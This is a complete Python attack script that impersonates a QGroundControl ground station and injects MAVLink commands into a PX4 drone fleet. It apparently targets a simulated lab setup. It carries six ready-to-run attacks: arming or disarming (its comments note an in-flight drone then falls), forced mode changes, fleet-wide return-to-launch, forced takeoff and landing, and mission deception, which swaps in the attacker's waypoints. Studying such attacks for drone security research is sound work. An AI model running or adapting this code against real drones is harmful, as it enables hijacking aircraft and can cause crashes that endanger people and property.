"""
Script: inject_drones_v2.py
============================
Injection towards fleet drones impersonating QGC.
Uses pymavlink to build packets correctly.
Opens a separate UDP connection per drone.

Attacks:
  A) ARM/DISARM        — arm or disarm a drone
  B) SET_MODE          — change flight mode
  C) RTL fleet         — force Return To Launch on all drones
  D) Forced TAKEOFF    — arm and takeoff
  E) Forced LAND       — immediate landing
  F) Mission Deception — replaces waypoints with attacker's route

Uso:
    python3 inject_drones_v2.py --attack C
    python3 inject_drones_v2.py --attack A --target-sysid 2 --arm
    python3 inject_drones_v2.py --attack B --target-sysid 3 --mode HOLD
    python3 inject_drones_v2.py --attack F --target-sysid 2
    python3 inject_drones_v2.py --attack D --target-sysid 2 --altitude 20

Requisiti:
    pip3 install pymavlink --break-system-packages
"""

import argparse
import time
import math
from datetime import datetime

try:
    from pymavlink import mavutil
    from pymavlink.dialects.v20 import common as mavlink2
except ImportError:
    print("[!] Installa pymavlink: pip3 install pymavlink --break-system-packages")
    exit(1)

# ═══════════════════════════════════════════════════════════════
#  CONFIG — valori confermati dal report di ricognizione
# ═══════════════════════════════════════════════════════════════

GCS_SYSID  = 255
GCS_COMPID = 190

FLEET = [
    {"sysid": 1, "compid": 1, "ip": "172.25.12.121", "port": 18570},
    {"sysid": 2, "compid": 1, "ip": "172.25.12.121", "port": 18571},
    {"sysid": 3, "compid": 1, "ip": "172.25.12.121", "port": 18572},
]

# Default PX4 SITL home coordinates (Zurich)
HOME_LAT = 47.397742
HOME_LON = 8.545594
HOME_ALT = 488.0

# ═══════════════════════════════════════════════════════════════

# MAVLink mode commands for PX4
MAV_CMD_NAV_RETURN_TO_LAUNCH = 20
MAV_CMD_NAV_TAKEOFF          = 22
MAV_CMD_NAV_LAND             = 21
MAV_CMD_NAV_WAYPOINT         = 16
MAV_CMD_DO_SET_MODE          = 176
MAV_CMD_COMPONENT_ARM_DISARM = 400
MAV_CMD_MISSION_START        = 300

# PX4 custom modes
PX4_MODE_MANUAL  = 1
PX4_MODE_HOLD    = 4
PX4_MODE_RTL     = 5
PX4_MODE_LAND    = 6
PX4_MODE_TAKEOFF = 2
PX4_MODE_MISSION = 3

MODE_MAP = {
    "MANUAL":  PX4_MODE_MANUAL,
    "HOLD":    PX4_MODE_HOLD,
    "RTL":     PX4_MODE_RTL,
    "LAND":    PX4_MODE_LAND,
    "TAKEOFF": PX4_MODE_TAKEOFF,
    "MISSION": PX4_MODE_MISSION,
}


def connect(drone: dict) -> mavutil.mavfile:
    """Opens a UDP connection to a specific drone."""
    conn = mavutil.mavlink_connection(
        f"udpout:{drone['ip']}:{drone['port']}",
        source_system=GCS_SYSID,
        source_component=GCS_COMPID,
    )
    time.sleep(0.3)
    return conn


def send_command(conn, target_sysid: int, target_compid: int,
                 command: int, p1=0, p2=0, p3=0,
                 p4=0, p5=0, p6=0, p7=0,
                 confirmations: int = 3):
    """
    Invia un COMMAND_LONG con il numero di confirmations richiesto.
    MAVLink requires confirmation=0,1,2 for critical commands.
    """
    for confirm in range(confirmations):
        conn.mav.command_long_send(
            target_sysid,
            target_compid,
            command,
            confirm,
            p1, p2, p3, p4, p5, p6, p7,
        )
        print(f"      confirm={confirm} → cmd={command} "
              f"target={target_sysid}/{target_compid}")
        time.sleep(0.1)


def get_targets(target_sysid=None) -> list:
    """Returns list of drones to attack."""
    if target_sysid:
        return [d for d in FLEET if d["sysid"] == target_sysid]
    return FLEET


# ─── Attacco A: ARM / DISARM ──────────────────────────────────
def attack_A(target_sysid=None, arm: bool = True):
    """
    Arm or disarm a drone impersonating QGC.
    If the drone is in flight and gets disarmed → it falls.
    """
    action = "ARM" if arm else "DISARM"
    print(f"\n{'='*60}")
    print(f"  [A] {action} — impersonating GCS sysid={GCS_SYSID}")
    print(f"{'='*60}\n")

    for drone in get_targets(target_sysid):
        print(f"  → Drone sysid={drone['sysid']} @ "
              f"{drone['ip']}:{drone['port']}")
        conn = connect(drone)
        send_command(
            conn,
            drone["sysid"], drone["compid"],
            MAV_CMD_COMPONENT_ARM_DISARM,
            p1=1.0 if arm else 0.0,
        )
        conn.close()
        print(f"    [{action}] complete for sysid={drone['sysid']}\n")
        time.sleep(0.3)

    print(f"\n  [+] Attack A ({action}) complete.")


# ─── Attacco B: SET_MODE ──────────────────────────────────────
def attack_B(target_sysid=None, mode: str = "RTL"):
    """
    Change the flight mode impersonating QGC.
    Available modes: MANUAL, HOLD, RTL, LAND, TAKEOFF, MISSION
    """
    custom_mode = MODE_MAP.get(mode.upper(), PX4_MODE_HOLD)

    print(f"\n{'='*60}")
    print(f"  [B] SET_MODE → {mode} (custom_mode={custom_mode})")
    print(f"{'='*60}\n")

    for drone in get_targets(target_sysid):
        print(f"  → Drone sysid={drone['sysid']}")
        conn = connect(drone)
        send_command(
            conn,
            drone["sysid"], drone["compid"],
            MAV_CMD_DO_SET_MODE,
            p1=1.0,                  # MAV_MODE_FLAG_CUSTOM_MODE_ENABLED
            p2=float(custom_mode),
        )
        conn.close()
        print(f"    SET_MODE {mode} complete for sysid={drone['sysid']}\n")
        time.sleep(0.3)

    print(f"\n  [+] Attack B (SET_MODE {mode}) complete.")


# ─── Attacco C: RTL entire fleet ──────────────────────────
def attack_C():
    """
    Force Return To Launch on the entire fleet simultaneously.
    All drones return to home position.
    Most visible and demonstrative result — all drones
    go home while QGC sent no command.
    """
    print(f"\n{'='*60}")
    print(f"  [C] FLEET RTL — entire fleet returning home!")
    print(f"  Impersonating GCS sysid={GCS_SYSID} compid={GCS_COMPID}")
    print(f"{'='*60}\n")

    for drone in FLEET:
        print(f"  → Drone sysid={drone['sysid']} "
              f"@ {drone['ip']}:{drone['port']}")
        conn = connect(drone)
        send_command(
            conn,
            drone["sysid"], drone["compid"],
            MAV_CMD_NAV_RETURN_TO_LAUNCH,
        )
        conn.close()
        print(f"    RTL sent to sysid={drone['sysid']}\n")
        time.sleep(0.3)

    print(f"\n  [+] Attack C complete.")
    print(f"  [+] Watch Gazebo and QGC — all drones returning home!")


# ─── Attacco D: TAKEOFF forzato ───────────────────────────────
def attack_D(target_sysid=None, altitude: float = 15.0):
    """
    Arm and take off a drone at a specified altitude.
    First sends ARM, then TAKEOFF with altitude.
    """
    print(f"\n{'='*60}")
    print(f"  [D] Forced TAKEOFF → altitude={altitude}m")
    print(f"{'='*60}\n")

    for drone in get_targets(target_sysid):
        print(f"  → Drone sysid={drone['sysid']}")
        conn = connect(drone)

        print(f"    Step 1: ARM...")
        send_command(
            conn,
            drone["sysid"], drone["compid"],
            MAV_CMD_COMPONENT_ARM_DISARM,
            p1=1.0,
        )
        time.sleep(1.0)

        print(f"    Step 2: TAKEOFF at {altitude}m...")
        send_command(
            conn,
            drone["sysid"], drone["compid"],
            MAV_CMD_NAV_TAKEOFF,
            p7=altitude,
        )
        conn.close()
        print(f"    TAKEOFF complete for sysid={drone['sysid']}\n")
        time.sleep(0.5)

    print(f"\n  [+] Attack D complete.")


# ─── Attacco E: LAND forzato ──────────────────────────────────
def attack_E(target_sysid=None):
    """
    Force immediate landing on one or all drones.
    If the drone is in active flight → lands immediately.
    """
    print(f"\n{'='*60}")
    print(f"  [E] Forced LAND — immediate landing")
    print(f"{'='*60}\n")

    for drone in get_targets(target_sysid):
        print(f"  → Drone sysid={drone['sysid']}")
        conn = connect(drone)
        send_command(
            conn,
            drone["sysid"], drone["compid"],
            MAV_CMD_NAV_LAND,
        )
        conn.close()
        print(f"    LAND sent to sysid={drone['sysid']}\n")
        time.sleep(0.3)

    print(f"\n  [+] Attack E complete.")


# ─── Attacco F: Mission Deception ────────────────────────────
def attack_F(target_sysid: int):
    """
    Mission Deception — sostituisce i waypoint della missione
    con un percorso scelto dall'attaccante.

    Il drone esegue fedelmente la missione falsa credendo
    sia quella originale programmata dall'operatore.
    QGC mostra il drone in volo normalmente ma verso
    destinazioni che l'operatore non ha scelto.

    Procedura:
    1. MISSION_CLEAR_ALL — cancella missione corrente
    2. Prima arma il drone e imposta GUIDED mode
    3. Manda waypoint uno alla volta via MISSION_ITEM_INT
    4. MISSION_COUNT — annuncia numero waypoint
    5. MISSION_START — avvia la missione falsa
    """
    drone = next((d for d in FLEET if d["sysid"] == target_sysid), None)
    if not drone:
        print(f"[!] sysid={target_sysid} non trovato in FLEET")
        return

    print(f"\n{'='*60}")
    print(f"  [F] Mission Deception → Drone sysid={target_sysid}")
    print(f"  Drone will follow the attacker's chosen route")
    print(f"{'='*60}\n")

    # Define the fake route — circle around home
    # Modify these coordinates to choose the route
    radius  = 0.0015   # circa 150 metri
    alt     = 25.0     # altitudine in metri sopra home

    waypoints = []
    # Home position (waypoint 0 — obbligatorio come primo)
    waypoints.append((HOME_LAT, HOME_LON, 0.0))
    # 6 waypoint in cerchio
    for i in range(6):
        angle   = i * (2 * math.pi / 6)
        wp_lat  = HOME_LAT + radius * math.cos(angle)
        wp_lon  = HOME_LON + radius * math.sin(angle)
        waypoints.append((wp_lat, wp_lon, alt))

    print(f"  Fake waypoints ({len(waypoints)} total):")
    for i, (lat, lon, a) in enumerate(waypoints):
        print(f"    WP[{i}]: lat={lat:.6f} lon={lon:.6f} alt={a:.1f}m")

    conn = connect(drone)

    # Step 1: MISSION_CLEAR_ALL
    print(f"\n  Step 1: MISSION_CLEAR_ALL...")
    conn.mav.mission_clear_all_send(target_sysid, drone["compid"])
    time.sleep(0.5)

    # Step 2: MISSION_COUNT — annuncia numero waypoint
    print(f"  Step 2: MISSION_COUNT = {len(waypoints)}...")
    conn.mav.mission_count_send(
        target_sysid, drone["compid"],
        len(waypoints),
        0,  # MAV_MISSION_TYPE_MISSION
    )
    time.sleep(0.5)

    # Step 3: invia ogni waypoint
    print(f"  Step 3: Sending waypoints...")
    for i, (lat, lon, alt_wp) in enumerate(waypoints):
        command = MAV_CMD_NAV_WAYPOINT
        current = 1 if i == 1 else 0  # waypoint 1 è il primo da raggiungere

        conn.mav.mission_item_int_send(
            target_sysid,
            drone["compid"],
            i,                    # seq
            3,                    # frame: MAV_FRAME_GLOBAL_RELATIVE_ALT
            command,
            current,              # current
            1,                    # autocontinue
            0.0,                  # param1 (hold time)
            0.0,                  # param2 (accept radius)
            0.0,                  # param3 (pass radius)
            float('nan'),         # param4 (yaw)
            int(lat * 1e7),       # lat (int32)
            int(lon * 1e7),       # lon (int32)
            alt_wp,               # alt
            0,                    # MAV_MISSION_TYPE_MISSION
        )
        print(f"    WP[{i}] inviato: {lat:.6f}, {lon:.6f}, {alt_wp:.1f}m")
        time.sleep(0.2)

    time.sleep(0.5)

    # Step 4: ARM
    print(f"\n  Step 4: ARM...")
    send_command(
        conn, target_sysid, drone["compid"],
        MAV_CMD_COMPONENT_ARM_DISARM,
        p1=1.0,
    )
    time.sleep(1.0)

    # Step 5: MISSION_START
    print(f"  Step 5: MISSION_START...")
    send_command(
        conn, target_sysid, drone["compid"],
        MAV_CMD_MISSION_START,
        p1=0.0,
        p2=float(len(waypoints) - 1),
    )

    conn.close()

    print(f"\n  [+] Mission Deception complete!")
    print(f"  [+] Drone {target_sysid} is executing the fake route.")
    print(f"  [+] Watch in Gazebo — flying towards our waypoints.")


# ─── MAIN ─────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="inject_drones_v2.py — Fleet control impersonating QGC"
    )
    parser.add_argument("--attack", required=True,
                        choices=["A","B","C","D","E","F","ALL"],
                        help="Attacco da eseguire")
    parser.add_argument("--target-sysid", type=int, default=None,
                        help="target drone sysid (default: all)")
    parser.add_argument("--arm",       action="store_true",
                        help="For attack A: arm (default: disarm)")
    parser.add_argument("--mode",      default="RTL",
                        help="For attack B: flight mode (default: RTL)")
    parser.add_argument("--altitude",  type=float, default=15.0,
                        help="For attack D: altitude in meters (default: 15)")
    args = parser.parse_args()

    print(f"\n{'='*60}")
    print(f"  inject_drones_v2.py — IoD Fleet Attack")
    print(f"  Impersonated GCS : sysid={GCS_SYSID} compid={GCS_COMPID}")
    print(f"  Target           : {args.target_sysid or 'entire fleet'}")
    print(f"  Attack           : {args.attack}")
    print(f"  Time             : {datetime.now().strftime('%H:%M:%S')}")
    print(f"{'='*60}\n")

    try:
        if args.attack == "A":
            attack_A(args.target_sysid, arm=args.arm)

        elif args.attack == "B":
            attack_B(args.target_sysid, mode=args.mode)

        elif args.attack == "C":
            attack_C()

        elif args.attack == "D":
            attack_D(args.target_sysid, altitude=args.altitude)

        elif args.attack == "E":
            attack_E(args.target_sysid)

        elif args.attack == "F":
            if not args.target_sysid:
                print("[!] Attack F requires a specific --target-sysid")
                return
            attack_F(args.target_sysid)

        elif args.attack == "ALL":
            print("[*] Full demo — Fleet RTL then Mission Deception\n")
            attack_C()
            time.sleep(5)
            attack_F(2)

    except KeyboardInterrupt:
        print(f"\n[!] Interrupted by user.")

    print(f"\n[*] inject_drones_v2.py done.")


if __name__ == "__main__":
    main()